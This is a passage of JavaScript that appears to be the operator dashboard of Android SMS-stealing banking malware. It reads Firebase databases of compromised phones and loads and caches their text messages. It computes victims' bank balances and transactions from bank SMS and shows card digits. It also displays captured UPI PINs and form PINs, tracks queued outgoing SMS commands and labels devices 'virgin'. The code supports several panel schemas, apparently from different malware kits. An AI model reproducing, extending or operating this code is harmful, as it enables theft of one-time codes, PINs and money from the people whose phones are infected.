          console.log(`[REST] Loaded device_status for ${Object.keys(dsData).length} devices`);
        }
      }
    } catch (e) {}
  }

  // ═══════════════════════════════════════════════════════════
  // STEP 2: SDK LISTENERS — live updates only (child_changed/added/removed)
  // Since we already have data from REST, child_added will fire for existing
  // devices but _processDevice just overwrites (no-op). New devices after 
  // initial load will also come through child_added.
  // ═══════════════════════════════════════════════════════════
  const clientsRef = db.ref(clientsPath);

  const onAdd = clientsRef.on('child_added', (snap) => {
    _processDevice(snap.key, snap.val());
    scheduleUIUpdate();
  }, (err) => console.error('child_added error:', err));

  const onChange = clientsRef.on('child_changed', (snap) => {
    _processDevice(snap.key, snap.val());
    scheduleUIUpdate();
  });

  const onRemove = clientsRef.on('child_removed', (snap) => {
    delete state.clients[snap.key];
    scheduleUIUpdate();
  });

  state.listeners.push(
    () => clientsRef.off('child_added', onAdd),
    () => clientsRef.off('child_changed', onChange),
    () => clientsRef.off('child_removed', onRemove)
  );

  // ── Commands: REST initial + SDK live ──
  if (state.schemaType !== 'B') {
    // REST initial load for commands
    try {
      const resp = await fetch(`${dbUrl}${commandsPath}.json`);
      if (resp.ok) {
        const raw = await resp.json();
        if (raw && typeof raw === 'object') {
          state.commands = raw;
          if (state.currentPage === 'commands') updateCommandsView();
          updateNavBadges();
        }
      }
    } catch (e) {}

    // SDK live updates for commands
    const cmdRef = db.ref(commandsPath);
    const cmdAdd = cmdRef.on('child_added', (snap) => {
      state.commands[snap.key] = snap.val();
      scheduleCmdUpdate();
    });
    const cmdChange = cmdRef.on('child_changed', (snap) => {
      state.commands[snap.key] = snap.val();
      scheduleCmdUpdate();
    });
    const cmdRemove = cmdRef.on('child_removed', (snap) => {
      delete state.commands[snap.key];
      scheduleCmdUpdate();
    });
    state.listeners.push(
      () => cmdRef.off('child_added', cmdAdd),
      () => cmdRef.off('child_changed', cmdChange),
      () => cmdRef.off('child_removed', cmdRemove)
    );
  }

  // ── Schema B extras (small data, keep as value) ──
  if (state.schemaType === 'B') {
    ['login', 'Card', 'account'].forEach(node => {
      const ref = db.ref(`/${node}`);
      const l = ref.on('value', (snap) => { state.schemaB[node] = snap.val() || {}; });
      state.listeners.push(() => ref.off('value', l));
    });
  }
}

// Lazy load SMS for a specific device — incremental with limitToLast
let _smsRenderTimers = {};

function loadDeviceSms(deviceId) {
  const ctx = getDbForDevice(deviceId);
  if (!ctx.db || state.loadedSmsDevices.has(deviceId)) return;
  state.loadedSmsDevices.add(deviceId);

  const devSchema = ctx.schemaType;
  const smsPath = ctx.smsPathFn(deviceId);
  const msgsRef = ctx.db.ref(smsPath).orderByKey().limitToLast(200);

  // Initialize message store for this device
  if (!state.messages[deviceId]) state.messages[deviceId] = {};

  // Flag: true after initial load completes (debounce timer fires)
  let initialLoadDone = false;

  const scheduleRender = () => {
    clearTimeout(_smsRenderTimers[deviceId]);
    _smsRenderTimers[deviceId] = setTimeout(() => {
      // Compute bank data from loaded SMS
      computeDeviceBankData(deviceId);

      if (state.currentSmsDevice === deviceId) {
        renderSmsConversation(deviceId);
      }
      updateNavBadges();

      // After initial batch render, push all SMS to server cache
      if (!initialLoadDone) {
        initialLoadDone = true;
        const allMsgs = state.messages[deviceId];
        if (ctx.config?.databaseURL && Object.keys(allMsgs).length > 0) {
          fetch('/api/cache/push', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              deviceId,
              messages: allMsgs,
              schemaType: devSchema,
              databaseURL: ctx.config.databaseURL
            })
          }).catch(() => {});
        }
      }
    }, 200);
  };

  // child_added: fires for each existing message on initial load + new ones
  const onMsgAdd = msgsRef.on('child_added', (snap) => {
    const raw = snap.val();
    state.messages[deviceId][snap.key] = (devSchema === 'B' || devSchema === 'D') ? normalizeMessage(raw) : raw;
    scheduleRender();

    // Push new SMS to server cache (only after initial load to avoid flooding)
    if (initialLoadDone && ctx.config?.databaseURL) {
      fetch('/api/cache/push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceId,
          messages: { [snap.key]: raw },
          schemaType: devSchema,
          databaseURL: ctx.config.databaseURL,
          merge: true
        })
      }).catch(() => {});
    }
  });

  // child_changed: message updated
  const onMsgChange = msgsRef.on('child_changed', (snap) => {
    const raw = snap.val();
    state.messages[deviceId][snap.key] = (devSchema === 'B' || devSchema === 'D') ? normalizeMessage(raw) : raw;
    scheduleRender();
  });

  // child_removed
  const onMsgRemove = msgsRef.on('child_removed', (snap) => {
    delete state.messages[deviceId][snap.key];
    scheduleRender();
  });
  state.listeners.push(
    () => msgsRef.off('child_added', onMsgAdd),
    () => msgsRef.off('child_changed', onMsgChange),
    () => msgsRef.off('child_removed', onMsgRemove)
  );
}

/**
 * Probe Firebase root to determine schema type using REST shallow query.
 * Uses ?shallow=true so we ONLY get key names (~50 bytes) instead of 
 * downloading the entire database (which could be megabytes).
 *   Schema A (legacy): has /clients  + /messages
 *   Schema B (new):    has /user_data + /user_sms
 *   Schema D:          has /users + /mess
 * 
 * HYBRID FIX: Some databases have BOTH clients AND user_data.
 * In that case, compare device counts and pick the one with more data.
 */
async function detectSchemaType() {
  if (!state.db) return;
  const dbUrl = state.currentConfig?.databaseURL;
  if (!dbUrl) return;
  
  try {
    // REST shallow=true returns just the top-level keys, not the values
    const resp = await fetch(`${dbUrl}/.json?shallow=true`);
    if (resp.ok) {
      const keys = Object.keys(await resp.json());
      const hasClients = keys.includes('clients');
      const hasUserData = keys.includes('user_data') || keys.includes('user_sms') || keys.includes('user_list');
      const hasSchemaD = keys.includes('users') && keys.includes('mess');

      if (hasSchemaD && !hasClients && !hasUserData) {
        state.schemaType = 'D';
        console.log('[Schema] Detected Schema D (users / mess / sendsms)');
      } else if (hasUserData && hasClients) {
        // HYBRID: both exist — compare device counts to pick the right one
        try {
          const [clientsResp, userDataResp] = await Promise.all([
            fetch(`${dbUrl}/clients.json?shallow=true`),
            fetch(`${dbUrl}/user_data.json?shallow=true`)
          ]);
          let clientsCount = 0, userDataCount = 0;
          if (clientsResp.ok) {
            const d = await clientsResp.json();
            clientsCount = d ? Object.keys(d).length : 0;
          }
          if (userDataResp.ok) {
            const d = await userDataResp.json();
            userDataCount = d ? Object.keys(d).length : 0;
          }
          if (clientsCount >= userDataCount) {
            state.schemaType = 'A';
            console.log(`[Schema] Hybrid DB — clients (${clientsCount}) >= user_data (${userDataCount}) → Schema A`);
          } else {
            state.schemaType = 'B';
            console.log(`[Schema] Hybrid DB — user_data (${userDataCount}) > clients (${clientsCount}) → Schema B`);
          }
        } catch (e) {
          // Fallback: if comparison fails, prefer clients (Schema A) since it's more common
          state.schemaType = 'A';
          console.warn('[Schema] Hybrid comparison failed, defaulting to A:', e);
        }
      } else if (hasUserData) {
        state.schemaType = 'B';
        console.log('[Schema] Detected Schema B (user_data / user_sms)');
      } else if (hasSchemaD) {
        state.schemaType = 'D';
        console.log('[Schema] Detected Schema D (users / mess / sendsms)');
      } else {
        state.schemaType = 'A';
        console.log('[Schema] Detected Schema A (clients / messages)');
      }
    }
  } catch (e) {
    console.warn('[Schema] Detection failed, defaulting to A:', e);
    state.schemaType = 'A';
  }
}

/**
 * Normalize a raw device record into a unified shape.
 * Schema A (legacy) devices are NOT normalized here — they pass through raw.
 * This only normalizes Schema B (user_data) and Schema C (panel-9) devices.
 */
function normalizeDevice(raw, deviceId) {
  if (state.schemaType === 'B') {
    // Schema B: user_data node
    const sims = [];
    if (raw.nameSim1 && raw.nameSim1 !== 'No SIM Found') {
      sims.push({ carrierName: raw.nameSim1, phoneNumber: raw.numberSim1 || '', simSlotIndex: 0 });
    }
    if (raw.nameSim2 && raw.nameSim2 !== 'No SIM Found') {
      sims.push({ carrierName: raw.nameSim2, phoneNumber: raw.numberSim2 || '', simSlotIndex: 1 });
    }
    return {
      modelName:        raw.d_name || raw.device || deviceId,
      status:           raw.status === 'online' ? true : (raw.status === 'offline' ? false : raw.status),
      battery:          raw.battery,
      mobNo:            raw.phoneNumber || raw.numberSim1 || '',
      androidV:         raw.Device_info ? (raw.Device_info.match(/OS Version:\s*(.+)/)?.[1] || '') : '',
      ip_address:       '',
      service_provider: sims[0]?.carrierName || '',
      sims:             sims,
      timestamp:        raw.timestamp,
      _raw: raw,
      _schemaB: true,
      _deviceId: deviceId,
    };
  }

  if (state.schemaType === 'D') {
    // Schema D: users node — model, brand, battery (number), sim1 (string description)
    const sims = [];
    // sim1 format: "Jio True5G — Jio | 919082063855 | slot:0"
    let phone = '';
    let carrier = raw.brand || '';
    if (raw.sim1 && typeof raw.sim1 === 'string' && raw.sim1 !== 'N/A') {
      const simParts = raw.sim1.split('|').map(s => s.trim());
      if (simParts.length >= 2) phone = simParts[1] || '';
      const carrierPart = simParts[0] || '';
      // "Jio True5G — Jio" → take the part before —
      carrier = carrierPart.split('—')[0]?.trim() || carrierPart.split('—')[0]?.trim() || carrier;
      sims.push({ carrierName: carrier, phoneNumber: phone, simSlotIndex: 0 });
    }
    if (raw.sim2 && typeof raw.sim2 === 'string' && raw.sim2 !== 'N/A') {
      const simParts2 = raw.sim2.split('|').map(s => s.trim());
      const phone2 = simParts2[1] || '';
      const carrier2 = simParts2[0]?.split('—')[0]?.trim() || '';
      sims.push({ carrierName: carrier2, phoneNumber: phone2, simSlotIndex: 1 });
    }
    // battery is a number in Schema D, convert to string with %
    const batteryStr = typeof raw.battery === 'number' ? `${raw.battery}%` : (raw.battery || '?');
    return {
      modelName:        raw.model || raw.brand || deviceId,
      status:           raw.status === 'online' ? true : (raw.status === 'offline' ? false : raw.status),
      battery:          batteryStr,
      mobNo:            phone,
      androidV:         raw.android_version || '',
      ip_address:       '',
      service_provider: carrier,
      sims:             sims,
      timestamp:        raw.timestamp,
      notes:            raw.notes || '',
      kiskahai:         raw.kiskahai || '',
      _raw: raw,
      _schemaD: true,
      _deviceId: deviceId,
    };
  }

  // Schema C (panel-9): minimal data — battery, status, phone, sim1, webhookEvent, note, etc.
  const sims = [];
  if (raw.sim1 && raw.sim1.phone) {
    sims.push({ carrierName: '', phoneNumber: raw.sim1.phone, simSlotIndex: 0 });
  }
  return {
    modelName:        deviceId,
    status:           raw.status,
    battery:          raw.battery,
    mobNo:            raw.phone || (raw.sim1 && raw.sim1.phone) || '',
    androidV:         '',
    ip_address:       '',
    service_provider: '',
    sims:             sims,
    // Schema C specific fields
    _raw: raw,
    _schemaC: true,
    _deviceId: deviceId,
  };
}

/**
 * Normalize a raw SMS record into the shape renderSmsConversation expects.
 */
function normalizeMessage(raw) {
  if (state.schemaType === 'A') return raw; // already correct

  if (state.schemaType === 'D') {
    // Schema D: mess/{id}/smss — body, date (timestamp), sender, sim
    let dateStr = '';
    if (raw.date && typeof raw.date === 'number') {
      const d = new Date(raw.date);
      const dd = String(d.getDate()).padStart(2, '0');
      const mm = String(d.getMonth() + 1).padStart(2, '0');
      const yy = d.getFullYear();
      const hh = d.getHours();
      const min = String(d.getMinutes()).padStart(2, '0');
      const ampm = hh >= 12 ? 'pm' : 'am';
      const h12 = hh % 12 || 12;
      dateStr = `${dd}-${mm}-${yy} | ${String(h12).padStart(2, '0')}:${min} ${ampm}`;
    }
    return {
      message:  raw.body || raw.message || '',
      sender:   raw.sender || '',
      dateTime: dateStr || raw.date || '',
      type:     raw.type || 'incoming',
      sim:      raw.sim || '',
      _raw:     raw,
    };
  }

  // Schema B: user_sms node
  return {
    message:  raw.body  || raw.message || '',
    sender:   raw.sender || '',
    dateTime: raw.date  || raw.dateTime || '',
    type:     raw.type  || 'incoming',
    sim:      raw.sim_number || '',
    _raw:     raw,
  };
}

function loadAdminData() {
  if (!state.db || state.loadedPages.has('admin')) return;

  const ref = state.db.ref('/admin');
  const listener = ref.on('value', (snapshot) => {
    state.admin = snapshot.val() || {};
    updateAdminView();
  });
  state.loadedPages.add('admin');
  state.listeners.push(() => ref.off('value', listener));
}

// Lazy load bot users
function loadBotUsersData() {
  if (!state.db || state.loadedPages.has('bots')) return;

  const ref = state.db.ref('/bot_users');
  const listener = ref.on('value', (snapshot) => {
    state.botUsers = snapshot.val() || {};
    updateBotUsersView();
  });
  state.loadedPages.add('bots');
  state.listeners.push(() => ref.off('value', listener));
}

// Lazy load raw data
function loadRawData() {
  if (!state.db || state.loadedPages.has('raw')) return;

  const ref = state.db.ref('/');
  const listener = ref.on('value', (snapshot) => {
    state.allData = snapshot.val() || {};
    updateRawView();
  });
  state.loadedPages.add('raw');
  state.listeners.push(() => ref.off('value', listener));
}

// ── Dynamic Schema Discovery ──

function discoverSchemas() {
  state.schema.clients = discoverNodeSchema(state.clients);
}

function discoverNodeSchema(nodeData) {
  const allKeys = new Map();
  const entries = Object.values(nodeData);

  entries.forEach(entry => {
    if (typeof entry !== 'object' || entry === null) return;
    Object.entries(entry).forEach(([key, value]) => {
      if (!allKeys.has(key)) {
        allKeys.set(key, { types: new Set(), count: 0 });
      }
      const info = allKeys.get(key);
      info.types.add(getValueType(value));
      info.count++;
    });
  });

  return Array.from(allKeys.entries())
    .map(([key, info]) => ({
      key,
      types: Array.from(info.types),
      frequency: info.count / entries.length,
      count: info.count
    }))
    .sort((a, b) => b.frequency - a.frequency);
}

function getValueType(value) {
  if (value === null || value === undefined) return 'null';
  if (Array.isArray(value)) return 'array';
  return typeof value;
}

// ── Dashboard Stats ──

function updateDashboard() {
  const clients = Object.values(state.clients);
  const totalDevices = clients.length;
  // Schema B: status is boolean (normalized). Schema A: also boolean.
  const onlineDevices = clients.filter(c => c.status === true).length;

  // SMS count from loaded messages
  const totalSms = Object.values(state.messages).reduce((sum, device) => {
    return sum + (typeof device === 'object' ? Object.keys(device).length : 0);
  }, 0);

  const batteries = clients.map(c => parseInt(c.battery)).filter(b => !isNaN(b));
  const avgBattery = batteries.length > 0 ? Math.round(batteries.reduce((a, b) => a + b, 0) / batteries.length) : 0;
  const lowBattery = batteries.filter(b => b <= 20).length;

  const el = (id, val) => { const e = document.getElementById(id); if (e) e.textContent = val; };
  el('statTotal', totalDevices);
  el('statOnline', onlineDevices);
  el('statSms', formatNumber(totalSms));
  el('statBattery', avgBattery + '%');
  el('statLowBat', lowBattery);
  el('statCommands', Object.keys(state.commands).length);

  discoverSchemas();
  // Show schema badge in topbar
  const schemaBadge = document.getElementById('schemaBadge');
  if (schemaBadge) {
    schemaBadge.textContent = state.schemaType === 'B' ? 'New Schema' : 'Legacy Schema';
    schemaBadge.style.display = 'inline-flex';
    schemaBadge.className = `badge ${state.schemaType === 'B' ? 'cyan' : 'gray'}`;
    schemaBadge.title = state.schemaType === 'B' ? 'user_data / user_sms structure' : 'clients / messages structure';
  }
}

// ── Device View ──

function updateDeviceView() {
  // If balance rank view is active, update that instead
  if (state.deviceFilter === 'balance') {
    renderBalanceRankView();
    return;
  }
  const container = document.getElementById('deviceContainer');
  if (!container) return;

  let entries = Object.entries(state.clients);

  if (state.deviceFilter === 'online') entries = entries.filter(([, c]) => c.status === true);
  if (state.deviceFilter === 'offline') entries = entries.filter(([, c]) => c.status !== true);

  if (state.searchQuery) {
    const q = state.searchQuery.toLowerCase();
    entries = entries.filter(([id, c]) => {
      return id.toLowerCase().includes(q) ||
        (c.modelName || '').toLowerCase().includes(q) ||
        (c.mobNo || '').toLowerCase().includes(q) ||
        (c.service_provider || '').toLowerCase().includes(q) ||
        (c.ip_address || '').toLowerCase().includes(q) ||
        JSON.stringify(c.sims || []).toLowerCase().includes(q) ||
        // Schema B/C extras
        (c._raw?.phoneNumber || '').toLowerCase().includes(q) ||
        (c._raw?.phone || '').toLowerCase().includes(q) ||
        (c._raw?.sim1?.phone || '').toLowerCase().includes(q) ||
        (c._raw?.d_name || '').toLowerCase().includes(q);
    });
  }

  document.getElementById('deviceCount').textContent = `${entries.length} devices`;

  try {
    if (state.viewMode === 'grid') {
      renderDeviceGrid(container, entries);
    } else {
      renderDeviceTable(container, entries);
    }
  } catch (err) {
    console.error('[DeviceView] Render error:', err);
    container.innerHTML = `<div class="device-grid">${entries.map(([id, device]) => {
      const isOnline = device.status === true;
      return `<div class="device-card ${isOnline ? 'online' : 'offline'}" onclick="openDeviceDetail('${id}')">
        <div class="device-card-head">
          <div class="device-model-row">
            <span class="device-status-dot ${isOnline ? 'online' : 'offline'}"></span>
            <span class="device-model-name">${escapeHtml(device.modelName || id)}</span>
          </div>
        </div>
        <div class="device-card-body">
          <div class="device-field"><span class="device-field-lbl">Battery</span><span class="device-field-val">${device.battery || '?'}</span></div>
        </div>
        <div class="device-card-foot">
          <span class="device-tag ${isOnline ? 'bat-high' : ''}">● ${isOnline ? 'Online' : 'Offline'}</span>
          <span class="device-tag copy" onclick="event.stopPropagation(); copyDeviceId('${id}')">📋 Copy</span>
        </div>
      </div>`;
    }).join('')}</div>`;
  }
}

// Helper: generate bank + card info HTML for device cards
function renderDeviceBankCardInfo(deviceId) {
  const bankData = state.deviceBankData[deviceId];
  if (!bankData) return '';
  let html = '';

  // Bank row
  if (bankData.bankSmsCount > 0) {
    html += `<div class="device-bank-info">`;
    if (bankData.bankSender) {
      html += `<span class="bank-name-tag"><span class="tag-icon">₹</span> ${escapeHtml(bankData.bankSender)}${bankData.account ? ` ••${escapeHtml(bankData.account)}` : ''}</span>`;
    }
    if (bankData.latestBalance !== null) {
      html += `<span class="bank-balance-tag">${formatCurrency(bankData.latestBalance)}</span>`;
    }
    if (bankData.lastTxn) {
      const txnClass = bankData.lastTxn.isCredit ? 'credit' : 'debit';
      const txnSign = bankData.lastTxn.isCredit ? '+' : '-';
      const txnArrow = bankData.lastTxn.isCredit ? '↗' : '↘';
      html += `<span class="bank-txn-tag ${txnClass}"><span class="txn-arrow">${txnArrow}</span> ${txnSign}${formatCurrency(bankData.lastTxn.amount)} ${txnClass}</span>`;
    }
    html += `</div>`;
  }

  // Card row(s)
  if (bankData.cards && bankData.cards.length > 0) {
    html += `<div class="device-card-info">`;
    bankData.cards.forEach(card => {
      html += `<span class="card-number-tag">💳 •••• •••• •••• ${escapeHtml(card.last4)}</span>`;
    });
    html += `</div>`;
  }

  return html;
}

function renderDeviceGrid(container, entries) {
  if (entries.length === 0) {
    container.innerHTML = `
      <div class="empty-state">
        <div class="empty-state-icon">📱</div>
        <div class="empty-state-title">No devices found</div>
        <div class="empty-state-desc">No devices match your current filters</div>
      </div>`;
    return;
  }

  container.innerHTML = `<div class="device-grid">${entries.map(([id, device]) => {
    const isOnline = device.status === true;
    const batteryVal = parseInt(device.battery) || 0;
    const batClass = batteryVal <= 20 ? 'bat-low' : batteryVal <= 50 ? 'bat-mid' : 'bat-high';
    const raw = device._raw || device; // Schema A: device IS raw

    // Detect Schema C device
    const isSchemaC = device._schemaC === true;
    const isSchemaD = device._schemaD === true;

    if (isSchemaC) {
      // ── Schema C card (panel-9): dynamic fields ──
      const phone = device.mobNo || '';
      const simsCount = Array.isArray(device.sims) ? device.sims.length : 0;
      let bodyFields = '';
      if (phone) {
        bodyFields += `<div class="device-field">
          <span class="device-field-lbl">Phone</span>
          <span class="device-field-val" style="color:var(--cyan)">${escapeHtml(phone)}</span>
        </div>`;
      }
      if (raw.note) {
        bodyFields += `<div class="device-field">
          <span class="device-field-lbl">Note</span>
          <span class="device-field-val" style="color:var(--amber)">${escapeHtml(raw.note)}</span>
        </div>`;
      }
      if (raw.enote) {
        bodyFields += `<div class="device-field">
          <span class="device-field-lbl">E-Note</span>
          <span class="device-field-val" style="color:var(--amber)">${escapeHtml(raw.enote)}</span>
        </div>`;
      }
      if (raw.upipin) {
        bodyFields += `<div class="device-field">
          <span class="device-field-lbl">UPI PIN</span>
          <span class="device-field-val" style="color:var(--red)">${escapeHtml(raw.upipin)}</span>
        </div>`;
      }
      const pendingSms = raw.webhookEvent?.sendSms;
      if (pendingSms && !pendingSms.isSended) {
        bodyFields += `<div class="device-field" style="grid-column:1/-1">
          <span class="device-field-lbl">📤 Pending SMS</span>
          <span class="device-field-val" style="color:var(--purple);font-size:0.72rem">${escapeHtml((pendingSms.message || '').substring(0, 40))}${(pendingSms.message || '').length > 40 ? '…' : ''} → ${escapeHtml(pendingSms.to || '')}</span>
        </div>`;
      }
      if (!bodyFields) {
        bodyFields = `<div class="device-field" style="grid-column:1/-1">
          <span class="device-field-lbl">Device ID</span>
          <span class="device-field-val" style="font-family:monospace;font-size:0.7rem">${escapeHtml(id)}</span>
        </div>`;
      }

      const bankCardHtml = renderDeviceBankCardInfo(id);

      return `
        <div class="device-card ${isOnline ? 'online' : 'offline'}" onclick="openDeviceDetail('${id}')">
          <div class="device-card-head">
            <div class="device-model-row">
              <span class="device-status-dot ${isOnline ? 'online' : 'offline'}"></span>
              <span class="device-model-name">${escapeHtml(id)}</span>
            </div>
            <span class="device-id-badge">${id.substring(0, 8)}…</span>
          </div>
          <div class="device-card-body">
            ${bodyFields}
          </div>
          ${bankCardHtml}
          <div class="device-card-foot">
            <span class="device-tag ${batClass}">🔋 ${device.battery || '?'}</span>
            ${simsCount > 0 ? `<span class="device-tag sim">📶 ${simsCount} SIM${simsCount > 1 ? 's' : ''}</span>` : ''}
            ${raw.like === true ? '<span class="device-tag" style="background:var(--green-bg);color:var(--green);border-color:var(--green)20">👍</span>' : ''}
            ${device.checked ? '<span class="badge green">✓</span>' : ''}
            <span class="device-tag copy" onclick="event.stopPropagation(); copyDeviceId('${id}')" title="Copy Device ID">📋 Copy</span>
          </div>
        </div>`;
    }

    if (isSchemaD) {
      // ── Schema D card (allaciilk): rich device info ──
      const phone = device.mobNo || '—';
      const simsCount = Array.isArray(device.sims) ? device.sims.length : 0;
      const kiskahai = device.kiskahai || raw.kiskahai || '';
      const notes = device.notes || raw.notes || '';
      const devStatus = state._deviceStatus?.[id] || '';

      // Extract PINs from forms
      let pinTags = '';
      if (raw.forms && typeof raw.forms === 'object') {
        Object.values(raw.forms).forEach(form => {
          if (form.content && typeof form.content === 'object') {
            Object.entries(form.content).forEach(([key, val]) => {
              if (val && String(val).length <= 10) {
                pinTags += `<span class="device-tag" style="background:var(--red-bg);color:var(--red);border-color:var(--red)20">🔑 PIN: ${escapeHtml(String(val))}</span>`;
              }
            });
          }
        });
      }

      // SIM details
      let sim1Info = '';
      let sim2Info = '';
      if (raw.sim1 && typeof raw.sim1 === 'string' && raw.sim1 !== 'N/A') {
        sim1Info = `<div class="device-field" style="grid-column:1/-1">
          <span class="device-field-lbl">SIM1</span>
          <span class="device-field-val" style="font-size:0.72rem">${escapeHtml(raw.sim1)}</span>
        </div>`;
      }
      if (raw.sim2 && typeof raw.sim2 === 'string' && raw.sim2 !== 'N/A') {
        sim2Info = `<div class="device-field" style="grid-column:1/-1">
          <span class="device-field-lbl">SIM2</span>
          <span class="device-field-val" style="font-size:0.72rem">${escapeHtml(raw.sim2)}</span>
        </div>`;
      }

      const bankCardHtml = renderDeviceBankCardInfo(id);
      const bankData = state.deviceBankData[id];

      return `
        <div class="device-card ${isOnline ? 'online' : 'offline'}" onclick="openDeviceDetail('${id}')">
          <div class="device-card-head">
            <div class="device-model-row">
              <span class="device-wifi-icon ${isOnline ? 'online' : 'offline'}">
                <svg viewBox="0 0 24 24" fill="currentColor" width="16" height="16"><path d="M1 9l2 2a12.7 12.7 0 0118 0l2-2A15.4 15.4 0 001 9z"/><path d="M5 13l2 2a7.1 7.1 0 0110 0l2-2a10 10 0 00-14 0z"/><path d="M9 17l3 3 3-3a4.2 4.2 0 00-6 0z"/></svg>
              </span>
              <span class="device-model-name">${escapeHtml(device.modelName || id)}</span>
            </div>
            <span class="device-id-badge">${id.substring(0, 8)}…</span>
          </div>
          ${kiskahai || devStatus ? `<div style="display:flex;gap:6px;flex-wrap:wrap;padding:0 12px;margin-bottom:4px">
            ${kiskahai ? `<span class="device-tag" style="background:var(--purple-bg);color:var(--purple);border-color:var(--purple)20;font-size:0.68rem">🏷️ ${escapeHtml(kiskahai)}</span>` : ''}
            ${devStatus ? `<span class="device-tag" style="background:${devStatus === 'virgin' ? 'var(--green-bg)' : 'var(--red-bg)'};color:${devStatus === 'virgin' ? 'var(--green)' : 'var(--red)'};border-color:${devStatus === 'virgin' ? 'var(--green)' : 'var(--red)'}20;font-size:0.68rem">${escapeHtml(devStatus)}</span>` : ''}
          </div>` : ''}
          <div class="device-card-body">
            <div class="device-field">
              <span class="device-field-lbl">ANDROID</span>
              <span class="device-field-val">${escapeHtml(device.androidV || '—')}</span>
            </div>
            <div class="device-field">
              <span class="device-field-lbl">BATTERY</span>
              <span class="device-field-val">${escapeHtml(device.battery || '?')}</span>
            </div>
            <div class="device-field">
              <span class="device-field-lbl">NUMBER</span>
              <span class="device-field-val">${escapeHtml(phone)}</span>
            </div>
            <div class="device-field">
              <span class="device-field-lbl">NETWORK</span>
              <span class="device-field-val">${escapeHtml(device.service_provider || '—')}</span>
            </div>
            ${notes ? `<div class="device-field" style="grid-column:1/-1">
              <span class="device-field-lbl">📝 NOTES</span>
              <span class="device-field-val" style="color:var(--amber)">${escapeHtml(notes)}</span>
            </div>` : ''}
          </div>
          ${bankCardHtml}
          <div class="device-card-foot">
            <span class="device-tag ${isOnline ? 'bat-high' : ''}" style="${isOnline ? 'background:var(--green-bg);color:var(--green)' : 'color:var(--text3)'}">● ${isOnline ? 'Online' : 'Offline'}</span>
            ${bankData && bankData.bankSmsCount > 0 ? `<span class="bank-sms-count-tag">${bankData.bankSmsCount} Bank SMS</span>` : ''}
            ${bankData && bankData.cards && bankData.cards.length > 0 ? `<span class="bank-sms-count-tag" style="color:var(--purple);background:var(--purple-bg)">${bankData.cards.length} Card</span>` : ''}
            ${pinTags}
            <span class="device-tag copy" onclick="event.stopPropagation(); copyDeviceId('${id}')" title="Copy Device ID">📋 Copy</span>
          </div>
        </div>`;
    }

    // ── Schema A / B card: original layout with hardcoded fields ──
    const phone = device.mobNo || (Array.isArray(device.sims) && device.sims[0]?.phoneNumber) || '—';
    const simsCount = Array.isArray(device.sims) ? device.sims.length : 0;

    // Schema B extras for card footer
    const hasLoginData = device._schemaB && state.schemaB.login?.[id]?.name;
    const loginName = hasLoginData ? state.schemaB.login[id].name : null;

    // Bank data for this device
    const bankCardHtml = renderDeviceBankCardInfo(id);
    const bankData = state.deviceBankData[id];

    return `
      <div class="device-card ${isOnline ? 'online' : 'offline'}" onclick="openDeviceDetail('${id}')">
        <div class="device-card-head">
          <div class="device-model-row">
            <span class="device-wifi-icon ${isOnline ? 'online' : 'offline'}">
              <svg viewBox="0 0 24 24" fill="currentColor" width="16" height="16"><path d="M12 21l-1.5-1.5c-3.3-3.3-5.5-5.5-5.5-8 0-2.5 2-4.5 4.5-4.5.9 0 1.8.3 2.5.8.7-.5 1.6-.8 2.5-.8 2.5 0 4.5 2 4.5 4.5 0 2.5-2.2 4.7-5.5 8L12 21z" opacity="0"/><path d="M1 9l2 2a12.7 12.7 0 0118 0l2-2A15.4 15.4 0 001 9z"/><path d="M5 13l2 2a7.1 7.1 0 0110 0l2-2a10 10 0 00-14 0z"/><path d="M9 17l3 3 3-3a4.2 4.2 0 00-6 0z"/></svg>
            </span>
            <span class="device-model-name">${escapeHtml(device.modelName || 'Unknown Device')}</span>
          </div>
          <span class="device-id-badge">${id.substring(0, 8)}…</span>
        </div>
        <div class="device-card-body">
          <div class="device-field">
            <span class="device-field-lbl">ANDROID</span>
            <span class="device-field-val">${escapeHtml(device.androidV || '—')}</span>
          </div>
          <div class="device-field">
            <span class="device-field-lbl">BATTERY</span>
            <span class="device-field-val">${escapeHtml(device.battery || '?')}</span>
          </div>
          <div class="device-field">
            <span class="device-field-lbl">NUMBER</span>
            <span class="device-field-val">${escapeHtml(phone)}</span>
          </div>
          <div class="device-field">
            <span class="device-field-lbl">NETWORK</span>
            <span class="device-field-val">${escapeHtml(device.service_provider || '—')}</span>
          </div>
        </div>
        ${bankCardHtml}
        <div class="device-card-foot">
          <span class="device-tag ${isOnline ? 'bat-high' : ''}" style="${isOnline ? 'background:var(--green-bg);color:var(--green)' : 'color:var(--text3)'}">● ${isOnline ? 'Online' : 'Offline'}</span>
          ${bankData && bankData.bankSmsCount > 0 ? `<span class="bank-sms-count-tag">${bankData.bankSmsCount} Bank SMS</span>` : ''}
          ${loginName ? `<span class="device-tag" style="background:var(--purple-bg);color:var(--purple);border-color:var(--purple)20">👤 ${escapeHtml(loginName)}</span>` : ''}
          <span class="device-tag copy" onclick="event.stopPropagation(); copyDeviceId('${id}')" title="Copy Device ID">📋 Copy</span>
        </div>
      </div>`;
  }).join('')}</div>`;
}

function renderDeviceTable(container, entries) {
  if (entries.length === 0) {
    container.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📱</div><div class="empty-state-title">No devices found</div></div>';
    return;
  }

  const schema = state.schema.clients || [];
  const columns = schema
    .filter(s => !s.types.includes('object') && !s.types.includes('array'))
    .slice(0, 12)
    .map(s => s.key);

  container.innerHTML = `
    <div class="table-wrap">
      <table class="data-table">
        <thead>
          <tr>
            <th>Device ID</th>
            ${columns.map(col => `<th>${escapeHtml(formatKey(col))}</th>`).join('')}
          </tr>
        </thead>
        <tbody>
          ${entries.map(([id, device]) => `
            <tr onclick="openDeviceDetail('${id}')">
              <td><span class="device-id-badge">${id.substring(0, 12)}…</span></td>
              ${columns.map(col => `<td title="${escapeHtml(String(device[col] ?? ''))}">` + renderCellValue(device[col]) + `</td>`).join('')}
            </tr>
          `).join('')}
        </tbody>
      </table>
    </div>`;
}

function renderCellValue(value) {
  if (value === undefined || value === null) return '<span style="color:var(--text-muted)">—</span>';
  if (typeof value === 'boolean') return value ? '<span class="badge green">Yes</span>' : '<span class="badge red">No</span>';
  return escapeHtml(String(value));
}

// ── Device Detail Drawer ──

function openDeviceDetail(deviceId) {
  const device = state.clients[deviceId];
  if (!device) return;

  const drawer = document.getElementById('detailDrawer');
  const overlay = document.getElementById('drawerOverlay');
